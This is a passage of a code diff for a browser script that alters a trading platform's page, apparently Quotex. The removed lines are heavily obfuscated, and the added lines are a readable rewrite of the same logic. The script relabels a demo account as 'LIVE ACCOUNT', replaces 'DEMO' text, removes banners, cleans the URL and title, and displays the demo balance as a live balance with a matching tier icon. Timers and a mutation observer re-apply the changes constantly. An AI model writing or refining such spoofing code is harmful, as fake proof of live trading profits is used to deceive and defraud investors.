-        }(109761, 109761);
-        const _1ig = live[_0[148]];
-        _191 = function () {
-          return _0[436];
-        }();
-        _1ig[_0[230]][_0[231]](_0[232][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[437][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _1ig[_0[230]][_0[231]](_0[438][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[439][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _1ig[_0[230]][_0[231]](_0[440][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[441][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _1ig[_0[230]][_0[231]](_0[442][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[443][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _1ig[_0[230]][_0[231]](_0[426][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[346][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        var _192 = _0[444];
-        const _1ih = _1ig[_0[148]];
-        _192 = (496520 ^ 496522) + (423646 ^ 423640);
-        if (_1ih && _1ih[_0[156]] !== _0[445][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) {
-          _1ih[_0[230]][_0[231]](_0[232][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[437][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-          _1ih[_0[230]][_0[231]](_0[438][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[446][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-          _1ih[_0[230]][_0[231]](_0[440][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[443][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-          _1ih[_0[230]][_0[231]](_0[447][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[430][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-          if (icon[_0[148]] === live) {
-            _1ih[_0[328]](icon, _1ig);
-          }
-        }
-      }
-    } else {
-      if (icon[_0[148]] !== live) {
-        live[_0[328]](icon, live[_0[416]]);
-      }
-      live[_0[334]][_0[165]](n => {
-        if (n[_0[335]] === Node[_0[336]]) {
-          var _193 = _0[448];
-          let t = n[_0[38]][_0[404]]();
-          _193 = function () {
-            return _0[448];
-          }();
-          if (t[_0[18]](_0[48][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))) {
-            n[_0[38]] = n[_0[38]][_0[50]](/demo/gi, _0[3])[_0[50]](/\s+/g, _0[296]);
-          }
-        }
-      });
-      var _194 = function (s, h) {
-        return s ^ h;
-      }(749500, 749499);
-      let _1ii = ![];
-      _194 = function () {
-        return _0[449];
-      }();
-      live[_0[334]][_0[165]](n => {
-        if (n[_0[335]] === Node[_0[336]] && !n[_0[38]][_0[18]](_0[312][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) && n[_0[38]][_0[18]](_0[53][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))) {
-          _1ii = function () {
-            return !![];
-          }();
-        }
-      });
-      if (!_1ii && !live[_0[29]](_0[372][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))) {
-        var _195 = function (s, h) {
-          return s + h;
-        }(800150 ^ 800146, 561991 ^ 561984);
-        const _1ij = document[_0[434]](_0[450][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _195 = function () {
-          return 931399 ^ 931394;
-        }();
-        live[_0[328]](_1ij, live[_0[416]][_0[435]]);
-      }
-    }
-  }
-  function _1o0() {
-    var _196 = function (s, h) {
-      return s + h;
-    }(355500 ^ 355503, 890193 ^ 890199);
-    let _1ik = _0[451][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-    _196 = (327745 ^ 327749) + (593773 ^ 593769);
-    var _197 = _0[452];
-    const _1il = _1nj();
-    _197 = (840787 ^ 840787) + (315339 ^ 315338);
-    if (_1il !== null) {
-      _1ik = _1ne(_1il);
-    }
-    _1n8(_0[315][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))[_0[165]](el => {
-      if (el[_0[38]] && el[_0[38]][_0[127]]() === _0[453][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) {
-        var _198 = _0[454];
-        let _1im = el[_0[148]];
-        _198 = function () {
-          return 501015 ^ 501010;
-        }();
-        if (_1im) {
-          var _199 = _0[455];
-          let _1in = _1im[_0[29]](_0[456][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-          _199 = (523065 ^ 523065) + (198555 ^ 198554);
-          if (_1in && _1in[_0[38]][_0[18]](_0[121])) {
-            if (_1ik !== _0[451][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) {
-              _1in[_0[38]] = _1ik;
-            }
+          const useEl = svg.querySelector('use');
+          if (useEl) {
+              if (useEl.getAttribute('href') !== href) useEl.setAttribute('href', href);
+              if (useEl.getAttribute('xlink:href') !== href) useEl.setAttribute('xlink:href', href);
           } else {
-            var _200 = _0[457];
-            let _1io = el[_0[458]];
-            _200 = (738536 ^ 738543) + (576501 ^ 576496);
-            if (_1io && _1io[_0[38]][_0[18]](_0[121])) {
-              if (_1ik !== _0[451][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) {
-                _1io[_0[38]] = _1ik;
-              }
-            }
+              svg.innerHTML = `<use xlink:href="${href}" href="${href}"></use>`;
           }
-        }
-      }
-    });
+      });
+
+      queryAllDeep('.qjGlZ').forEach((el) => {
+          if (el.textContent.trim().toLowerCase() !== info.label) {
+              el.textContent = info.label;
+          }
+      });
+
+      queryAllDeep('.VgpLl').forEach((el) => {
+          if (el.textContent.trim() !== info.profit) {
+              el.textContent = info.profit;
+          }
+      });
   }
-  function _1o1() {
-    _mi();
-    _ml();
-    var _201 = function (s, h) {
-      return s ^ h;
-    }(429953, 429956);
-    const _1ip = _1n6();
-    _201 = (738014 ^ 738007) + (110271 ^ 110271);
-    var _202 = _0[459];
-    const _1iq = _1ip ? _0[331][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) : _0[53][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-    _202 = function () {
-      return 222573 ^ 222565;
-    }();
-    var _203 = _0[460];
-    const _1ir = document[_0[29]](_0[170][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-    _203 = function () {
-      return _0[460];
-    }();
-    if (_1ir) {
-      var _204 = function (s, h) {
-        return s + h;
-      }(343542 ^ 343538, 367238 ^ 367233);
-      const _1is = _1ir[_0[16]] ? _1ir[_0[16]][_0[29]](_0[461][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))?.[_0[38]] || _1ir[_0[261]] : _1ir[_0[261]];
-      _204 = function () {
-        return 478730 ^ 478731;
-      }();
-      var _205 = function (s, h) {
-        return s ^ h;
-      }(434669, 434670);
-      const _1it = _1is[_0[174]](/\$([\d,]+\.?\d*)/);
-      _205 = function () {
-        return _0[462];
-      }();
-      var _206 = function (s, h) {
-        return s ^ h;
-      }(138238, 138234);
-      const _1iu = _1it ? parseFloat(_1it[733252 ^ 733253][_0[50]](/,/g, _0[3])) : 869597 ^ 877517;
-      _206 = function () {
-        return 457496 ^ 457500;
-      }();
-      var _207 = function (s, h) {
-        return s + h;
-      }(910032 ^ 910040, 758569 ^ 758573);
-      const _1iv = _1it ? _1it[520292 ^ 520292] : _0[463][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-      _207 = (739936 ^ 739938) + (660315 ^ 660317);
-      var _208 = function (s, h) {
-        return s ^ h;
-      }(171628, 171626);
-      const _1iw = _1nx(_1iu);
-      _208 = (907213 ^ 907209) + (134300 ^ 134302);
-      var _209 = function (s, h) {
-        return s + h;
-      }(114457 ^ 114460, 817679 ^ 817678);
-      const _1ix = _1ip ? _0[354][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) : _0[427][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-      _209 = (767182 ^ 767177) + (387886 ^ 387883);
-      var _210 = function (s, h) {
-        return s + h;
-      }(898392 ^ 898398, 822058 ^ 822062);
-      const _1iy = `
-              <svg class="icon" style="width: ${_1ix}; height: ${_1ix}; margin-left: 0px; fill: #0faf59;">
-                  <use xlink:href="/profile/images/spritemap.svg#${_1iw}" href="/profile/images/spritemap.svg#${_1iw}"></use>
+
+  function fixAccountAndIcon(balance){
+      fixAccountLabels();
+      removeBonusBanner();
+      syncDropdownProfileTier(balance);
+
+      const desktop = isDesktopView();
+      const desiredLabel = desktop ? 'LIVE ACCOUNT' : 'LIVE';
+
+      const live = [...document.querySelectorAll('.v2KPX')].find(e => {
+          const t = e.textContent.trim().toUpperCase();
+          return t.includes('DEMO') || t.includes('LIVE');
+      });
+
+      if(!live) return;
+
+      live.querySelectorAll('svg.icon-academic, svg:not(.qx-level-icon)').forEach(el => el.remove());
+
+      const level = getLevel(balance);
+      const href = '/profile/images/spritemap.svg#' + level;
+      let icon = live.querySelector('.qx-level-icon') || (desktop ? live.parentElement?.parentElement?.querySelector('.qx-level-icon') : null);
+
+      if(!icon){
+          icon = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+          icon.setAttribute('class', 'qx-level-icon');
+          icon.setAttribute('viewBox', '0 0 24 24');
+          icon.innerHTML = `<use href="${href}" xlink:href="${href}"></use>`;
+          live.insertBefore(icon, live.firstChild);
+      }else{
+          const use = icon.querySelector('use');
+          if(use && use.getAttribute('href') !== href){
+              use.setAttribute('href', href);
+              use.setAttribute('xlink:href', href);
+          }
+      }
+
+      if (desktop) {
+          icon.style.setProperty('width', '20px', 'important');
+          icon.style.setProperty('height', '20px', 'important');
+          icon.style.setProperty('min-width', '20px', 'important');
+          icon.style.setProperty('max-width', '20px', 'important');
+          icon.style.setProperty('min-height', '20px', 'important');
+          icon.style.setProperty('max-height', '20px', 'important');
+          icon.style.setProperty('flex', '0 0 20px', 'important');
+          icon.style.setProperty('margin-left', '0px', 'important');
+          icon.style.setProperty('margin-right', '4px', 'important');
+          live.style.setProperty('font-size', '10px', 'important');
+          live.style.setProperty('font-weight', '900', 'important');
+          live.style.setProperty('line-height', '1.2', 'important');
+      } else {
+          icon.style.setProperty('width', '16px', 'important');
+          icon.style.setProperty('height', '16px', 'important');
+          icon.style.setProperty('min-width', '16px', 'important');
+          icon.style.setProperty('max-width', '16px', 'important');
+          icon.style.setProperty('min-height', '16px', 'important');
+          icon.style.setProperty('max-height', '16px', 'important');
+          icon.style.setProperty('flex', '0 0 16px', 'important');
+          icon.style.setProperty('margin-left', '-10px', 'important');
+          icon.style.setProperty('margin-right', '8px', 'important');
+      }
+
+      if (desktop) {
+          let hasDesiredText = false;
+          live.childNodes.forEach(n => {
+              if(n.nodeType === Node.TEXT_NODE){
+                  const upper = n.textContent.toUpperCase();
+                  if(upper.includes('DEMO') || upper.includes('LIVE')){
+                      const cleaned = n.textContent
+                          .replace(/live\s*account/gi, '')
+                          .replace(/demo\s*account/gi, '')
+                          .replace(/demo/gi, '')
+                          .replace(/live/gi, '')
+                          .trim();
+                      if (!hasDesiredText) {
+                          n.textContent = cleaned ? `${desiredLabel} ${cleaned}` : `${desiredLabel} `;
+                          hasDesiredText = true;
+                      } else {
+                          n.textContent = cleaned;
+                      }
+                  }
+              }
+          });
+          if(!hasDesiredText){
+              const textNode = document.createTextNode(`${desiredLabel} `);
+              if (icon.nextSibling && icon.parentElement === live) {
+                  live.insertBefore(textNode, icon.nextSibling);
+              } else {
+                  live.appendChild(textNode);
+              }
+          }
+
+          if (live.parentElement) {
+              const wrapper = live.parentElement;
+              wrapper.style.setProperty('display', 'inline-flex', 'important');
+              wrapper.style.setProperty('flex-direction', 'column', 'important');
+              wrapper.style.setProperty('align-items', 'flex-start', 'important');
+              wrapper.style.setProperty('justify-content', 'center', 'important');
+              wrapper.style.setProperty('line-height', '1.2', 'important');
+
+              const outerBtn = wrapper.parentElement;
+              if (outerBtn && outerBtn.tagName !== 'HEADER') {
+                  outerBtn.style.setProperty('display', 'inline-flex', 'important');
+                  outerBtn.style.setProperty('flex-direction', 'row', 'important');
+                  outerBtn.style.setProperty('align-items', 'center', 'important');
+                  outerBtn.style.setProperty('gap', '8px', 'important');
+                  if (icon.parentElement === live) {
+                      outerBtn.insertBefore(icon, wrapper);
+                  }
+              }
+          }
+      } else {
+          if (icon.parentElement !== live) {
+              live.insertBefore(icon, live.firstChild);
+          }
+          live.childNodes.forEach(n => {
+              if(n.nodeType === Node.TEXT_NODE){
+                  let t = n.textContent.toUpperCase();
+                  if(t.includes('DEMO')){
+                      n.textContent = n.textContent.replace(/demo/gi, '').replace(/\s+/g, ' ');
+                  }
+              }
+          });
+
+          let hasLiveText = false;
+          live.childNodes.forEach(n => {
+              if(n.nodeType === Node.TEXT_NODE && n.textContent.includes('LIVE')){
+                  hasLiveText = true;
+              }
+          });
+
+          if(!hasLiveText && !live.querySelector('span')){
+              const textNode = document.createTextNode('LIVE ');
+              live.insertBefore(textNode, live.firstChild.nextSibling);
+          }
+      }
+  }
+
+  function fixBalancesAndUI(){
+      let mainBalance = "$0.00";
+      const liveNum = getHeaderLiveBalanceValue();
+      if (liveNum !== null) {
+          mainBalance = formatUsd(liveNum);
+      }
+
+      queryAllDeep('div, span').forEach(el => {
+          if(el.textContent && el.textContent.trim() === 'The daily limit is not set'){
+              let parent = el.parentElement;
+              if(parent){
+                  let priceTag = parent.querySelector('span, div');
+                  if(priceTag && priceTag.textContent.includes('$')){
+                      if(mainBalance !== "$0.00"){
+                          priceTag.textContent = mainBalance;
+                      }
+                  }else{
+                      let prevEl = el.previousElementSibling;
+                      if(prevEl && prevEl.textContent.includes('$')){
+                          if(mainBalance !== "$0.00"){
+                              prevEl.textContent = mainBalance;
+                          }
+                      }
+                  }
+              }
+          }
+      });
+  }
+
+  function guardLive(){
+      cleanUrl();
+      cleanTitle();
+
+      const desktop = isDesktopView();
+      const desiredLabel = desktop ? 'LIVE ACCOUNT' : 'LIVE';
+
+      const trigger = document.querySelector('qx-usermenu-trigger');
+      if (trigger) {
+          const rawBalanceText = trigger.shadowRoot
+              ? (trigger.shadowRoot.querySelector('.balance')?.textContent || trigger.innerText)
+              : trigger.innerText;
+
+          const match = rawBalanceText.match(/\$([\d,]+\.?\d*)/);
+          const balanceNum = match ? parseFloat(match[1].replace(/,/g, '')) : 10000;
+          const currentBalanceStr = match ? match[0] : '$10,000.00';
+
+          const currentIconId = getLevel(balanceNum);
+          const iconSize = desktop ? '20px' : '16px';
+          const iconSvgHtml = `
+              <svg class="icon" style="width: ${iconSize}; height: ${iconSize}; margin-left: 0px; fill: #0faf59;">
+                  <use xlink:href="/profile/images/spritemap.svg#${currentIconId}" href="/profile/images/spritemap.svg#${currentIconId}"></use>
               </svg>
           `;
-      _210 = function () {
-        return _0[464];
-      }();
-      if (_1ir[_0[16]]) {
-        var _211 = _0[465];
-        const _1iz = _1ir[_0[16]][_0[29]](_0[466][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _211 = function () {
-          return 210687 ^ 210680;
-        }();
-        if (_1iz && _1ip) {
-          _1iz[_0[230]][_0[329]] = _0[419][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-          _1iz[_0[230]][_0[467]] = _0[443][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-          _1iz[_0[230]][_0[468]] = _0[446][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-          _1iz[_0[230]][_0[469]] = _0[430][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-        }
-        var _212 = _0[470];
-        const _1j0 = _1ir[_0[16]][_0[29]](_0[471][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _212 = function () {
-          return _0[470];
-        }();
-        if (_1j0 && _1ip) {
-          _1j0[_0[230]][_0[329]] = _0[419][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-          _1j0[_0[230]][_0[468]] = _0[439][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-          _1j0[_0[230]][_0[467]] = _0[441][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-          _1j0[_0[230]][_0[472]] = _0[443][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-          _1j0[_0[230]][_0[345]] = _0[346][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-        }
-        var _213 = function (s, h) {
-          return s ^ h;
-        }(484693, 484692);
-        const _1j1 = _1ir[_0[16]][_0[29]](_0[473][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _213 = (507963 ^ 507966) + (437441 ^ 437446);
-        if (_1j1) {
-          _1j1[_0[230]][_0[264]] = _1ix;
-          _1j1[_0[230]][_0[265]] = _1ix;
-          _1j1[_0[230]][_0[474]] = _0[378][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-          var _214 = function (s, h) {
-            return s + h;
-          }(615895 ^ 615895, 790649 ^ 790649);
-          const _1j2 = _1j1[_0[29]](_0[394][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-          _214 = function () {
-            return _0[475];
-          }();
-          if (!_1j2 || !_1j2[_0[154]](_0[395][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))?.[_0[18]](_1iw)) {
-            _1j1[_0[476]] = _1iy;
-          }
-        } else {
-          if (_1iz && !_1iz[_0[29]](_0[477][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))) {
-            _1iz[_0[478]](_0[479][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _1iy);
-          }
-        }
-        var _215 = function (s, h) {
-          return s ^ h;
-        }(593606, 593604);
-        const _1j3 = _1ir[_0[16]][_0[29]](_0[480][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _215 = function () {
-          return _0[481];
-        }();
-        if (_1j3) {
-          if (_1j3[_0[38]][_0[127]]() !== _1iq) {
-            _1j3[_0[38]] = _1iq;
-          }
-          _1j3[_0[230]][_0[340]] = _0[275][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-          _1j3[_0[230]][_0[341]] = _0[342][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-          if (_1ip) {
-            _1j3[_0[230]][_0[343]] = _0[344][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-            _1j3[_0[230]][_0[345]] = _0[346][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-          }
-        }
-        var _216 = _0[482];
-        const _1j4 = _1ir[_0[16]][_0[29]](_0[483][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _216 = function () {
-          return _0[482];
-        }();
-        if (_1j4 && _1ip) {
-          _1j4[_0[230]][_0[345]] = _0[484][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-          _1j4[_0[230]][_0[343]] = _0[485][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-          _1j4[_0[230]][_0[341]] = _0[486][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-        }
-      } else {
-        var _217 = function (s, h) {
-          return s + h;
-        }(629851 ^ 629855, 102418 ^ 102427);
-        const _1j5 = document[_0[254]](_0[170][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _217 = function () {
-          return 364157 ^ 364148;
-        }();
-        for (let attr of _1ir[_0[487]]) {
-          _1j5[_0[138]](attr[_0[488]], attr[_0[32]]);
-        }
-        var _218 = function (s, h) {
-          return s + h;
-        }(964978 ^ 964986, 140420 ^ 140422);
-        const _1ky = _1j5[_0[60]]({
-          mode: _0[61][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])
-        });
-        _218 = function () {
-          return _0[489];
-        }();
-        _1ky[_0[397]] = _1ip ? `
+
+          if (trigger.shadowRoot) {
+              const rootDiv = trigger.shadowRoot.querySelector('.root');
+              if (rootDiv && desktop) {
+                  rootDiv.style.display = 'flex';
+                  rootDiv.style.alignItems = 'center';
+                  rootDiv.style.flexDirection = 'row';
+                  rootDiv.style.gap = '8px';
+              }
+              const textWrap = trigger.shadowRoot.querySelector('.text');
+              if (textWrap && desktop) {
+                  textWrap.style.display = 'flex';
+                  textWrap.style.flexDirection = 'column';
+                  textWrap.style.alignItems = 'flex-start';
+                  textWrap.style.justifyContent = 'center';
+                  textWrap.style.lineHeight = '1.2';
+              }
+
+              const currentIcon = trigger.shadowRoot.querySelector('svg.icon, svg:first-of-type');
+              if (currentIcon) {
+                  currentIcon.style.width = iconSize;
+                  currentIcon.style.height = iconSize;
+                  currentIcon.style.marginLeft = '0px';
+                  const useTag = currentIcon.querySelector('use');
+                  if (!useTag || !useTag.getAttribute('href')?.includes(currentIconId)) {
+                      currentIcon.outerHTML = iconSvgHtml;
+                  }
+              } else {
+                  if (rootDiv && !rootDiv.querySelector('svg.icon')) {
+                      rootDiv.insertAdjacentHTML('afterbegin', iconSvgHtml);
+                  }
+              }
+
+              const nameDiv = trigger.shadowRoot.querySelector('.name, div[class*="name"]');
+              if (nameDiv) {
+                  if (nameDiv.textContent.trim() !== desiredLabel) {
+                      nameDiv.textContent = desiredLabel;
+                  }
+                  nameDiv.style.color = '#0faf59';
+                  nameDiv.style.fontWeight = '900';
+                  if (desktop) {
+                      nameDiv.style.fontSize = '10px';
+                      nameDiv.style.lineHeight = '1.2';
+                  }
+              }
+
+              const balDiv = trigger.shadowRoot.querySelector('.balance, div[class*="balance"]');
+              if (balDiv && desktop) {
+                  balDiv.style.lineHeight = '1.28';
+                  balDiv.style.fontSize = '14px';
+                  balDiv.style.fontWeight = '700';
+              }
+          } else {
+              const newTrigger = document.createElement('qx-usermenu-trigger');
+              for (let attr of trigger.attributes) {
+                  newTrigger.setAttribute(attr.name, attr.value);
+              }
+              const shadow = newTrigger.attachShadow({ mode: 'open' });
+              shadow.innerHTML = desktop
+                  ? `
                   <style>
                       :host { display: inline-flex; align-items: center; }
                       .root { display: flex; flex-direction: row; align-items: center; gap: 8px; cursor: pointer; }
@@ -2303,16 +1152,17 @@ var _0 = ["matchMedia", ")xp967 :htdiw-nim(", "split", "", "reverse", "join", "m
                       .icon { width: 20px; height: 20px; fill: #0faf59; }
                   </style>
                   <div class="root">
-                      ${_1iy}
+                      ${iconSvgHtml}
                       <div class="text">
                           <div class="name">LIVE ACCOUNT</div>
-                          <div class="balance">${_1iv}</div>
+                          <div class="balance">${currentBalanceStr}</div>
                       </div>
                       <svg class="caret" width="9" height="9" viewBox="0 0 10 6" fill="none" xmlns="http://www.w3.org/2000/svg">
                           <path d="M1 1L5 5L9 1" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                       </svg>
                   </div>
-                  ` : `
+                  `
+                  : `
                   <style>
                       :host { display: block; }
                       .root { display: flex; align-items: center; gap: 8px; cursor: pointer; }
@@ -2322,122 +1172,104 @@ var _0 = ["matchMedia", ")xp967 :htdiw-nim(", "split", "", "reverse", "join", "m
                       .icon { width: 16px; height: 16px; fill: #0faf59; }
                   </style>
                   <div class="root">
-                      ${_1iy}
+                      ${iconSvgHtml}
                       <div class="text">
                           <div class="name">LIVE</div>
-                          <div class="balance">${_1iv}</div>
+                          <div class="balance">${currentBalanceStr}</div>
                       </div>
                       <svg class="caret" width="10" height="6" viewBox="0 0 10 6" fill="none" xmlns="http://www.w3.org/2000/svg">
                           <path d="M1 1L5 5L9 1" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                       </svg>
                   </div>
                   `;
-        if (_1ir[_0[327]]) {
-          _1ir[_0[327]][_0[490]](_1j5, _1ir);
-        }
-      }
-    }
-    document[_0[12]](_0[491][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))[_0[165]](el => {
-      if (el[_0[334]][_0[9]] === (532262 ^ 532263) && el[_0[334]][456289 ^ 456289][_0[335]] === Node[_0[336]]) {
-        if (el[_0[38]][_0[127]]() === _0[48][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) {
-          el[_0[38]] = _1iq;
-          el[_0[230]][_0[340]] = _0[275][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-          el[_0[230]][_0[341]] = _0[342][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-          if (_1ip) {
-            el[_0[230]][_0[343]] = _0[344][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-            el[_0[230]][_0[345]] = _0[346][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
+              if (trigger.parentNode) {
+                  trigger.parentNode.replaceChild(newTrigger, trigger);
+              }
           }
-        }
       }
-    });
+
+      document.querySelectorAll('div, span, a').forEach(el => {
+          if (el.childNodes.length === 1 && el.childNodes[0].nodeType === Node.TEXT_NODE) {
+              if (el.textContent.trim() === 'DEMO') {
+                  el.textContent = desiredLabel;
+                  el.style.color = '#0faf59';
+                  el.style.fontWeight = '900';
+                  if (desktop) {
+                      el.style.fontSize = '10px';
+                      el.style.lineHeight = '1.2';
+                  }
+              }
+          }
+      });
   }
-  function fix() {
-    var _219 = _0[492];
-    const _1kz = _1nm() || 842581 ^ 842581;
-    _219 = (795567 ^ 795566) + (516326 ^ 516335);
-    _1o1();
-    _1nz(_1kz);
-    _1o0();
-    _1ns();
-    _1np();
-    _ml();
-    _1nt();
-    _1nv();
-    _1nl();
-    _1nk();
+
+  function fix(){
+      const balance = getBalance() || 0;
+      guardLive();
+      fixAccountAndIcon(balance);
+      fixBalancesAndUI();
+      cleanTitle();
+      fixAccountLabels();
+      enforceLiveIndicatorUI();
+      fixDemoAccountBalance();
+      syncLiveBalanceWithDropdown();
   }
+
   fix();
-  window[_0[200]](_0[493][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), fix);
-  var _220 = _0[494];
-  let _1l0 = null;
-  _220 = (199076 ^ 199079) + (953450 ^ 953450);
-  window[_0[82]] = setInterval(() => {
-    var _221 = function (s, h) {
-      return s + h;
-    }(323409 ^ 323414, 868458 ^ 868460);
-    const _1l1 = _1nm();
-    _221 = (488862 ^ 488857) + (731214 ^ 731207);
-    if (_1l1 !== null && _1l1 !== _1l0) {
-      _1l0 = _1l1;
-      _1nz(_1l1);
-      _1o0();
-    }
-    _1ny(_1l1 || 929683 ^ 929683);
-    _1o1();
-    _1ns();
-    _1np();
-    _ml();
-    _1nt();
-    _1nv();
-    _1nk();
-  }, 618280 ^ 618274);
-  window[_0[83]] = setInterval(_1np, 111333 ^ 111561);
-  window[_0[84]] = setInterval(() => {
-    _1nl();
-    _1nk();
-  }, 644395 ^ 644283);
-  var _222 = function (s, h) {
-    return s ^ h;
-  }(825597, 825592);
-  let _1l2 = ![];
-  _222 = function () {
-    return _0[495];
-  }();
-  window[_0[78]] = new MutationObserver(mutations => {
-    for (let _1l3 of mutations) {
-      if (_1l3[_0[496]]) {
-        _1l3[_0[496]][_0[165]](node => {
-          if (node[_0[335]] === Node[_0[497]]) {
-            if (node[_0[38]] && (node[_0[38]][_0[18]](_0[47][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) || node[_0[38]][_0[18]](_0[48][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])))) {
-              _1nt();
-            }
-          }
-        });
+  window.addEventListener('resize', fix);
+
+  let lastKnownBalance = null;
+  window.qxBalanceInterval = setInterval(() => {
+      const balance = getBalance();
+      if(balance !== null && balance !== lastKnownBalance){
+          lastKnownBalance = balance;
+          fixAccountAndIcon(balance);
+          fixBalancesAndUI();
       }
-    }
-    if (_1l2) return;
-    _1l2 = function () {
-      return !![];
-    }();
-    requestAnimationFrame(() => {
-      fix();
-      _1l2 = function () {
-        return ![];
-      }();
-    });
+      syncDropdownProfileTier(balance || 0);
+      guardLive();
+      cleanTitle();
+      fixAccountLabels();
+      enforceLiveIndicatorUI();
+      syncLiveBalanceWithDropdown();
+  }, 10);
+
+  window.qxDemoBalanceFixInterval = setInterval(() => {
+      fixDemoAccountBalance();
+      syncLiveBalanceWithDropdown();
+  }, 400);
+
+  let qxScheduled = false;
+  window.qxLiveObserver = new MutationObserver((mutations) => {
+      for(let mutation of mutations){
+          if(mutation.addedNodes){
+              mutation.addedNodes.forEach(node => {
+                  if(node.nodeType === Node.ELEMENT_NODE){
+                      if(node.textContent && (node.textContent.includes('Demo') || node.textContent.includes('DEMO'))){
+                          fixAccountLabels();
+                      }
+                  }
+              });
+          }
+      }
+      if(qxScheduled) return;
+      qxScheduled = true;
+      requestAnimationFrame(() => {
+          fix();
+          qxScheduled = false;
+      });
   });
-  window[_0[78]][_0[498]](document[_0[151]], {
-    childList: !![],
-    subtree: !![],
-    characterData: !![]
+
+  window.qxLiveObserver.observe(document.body, {
+      childList: true,
+      subtree: true,
+      characterData: true
   });
-  var _223 = function (s, h) {
-    return s + h;
-  }(861632 ^ 861641, 222632 ^ 222633);
-  const _1l4 = document[_0[254]](_0[255][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
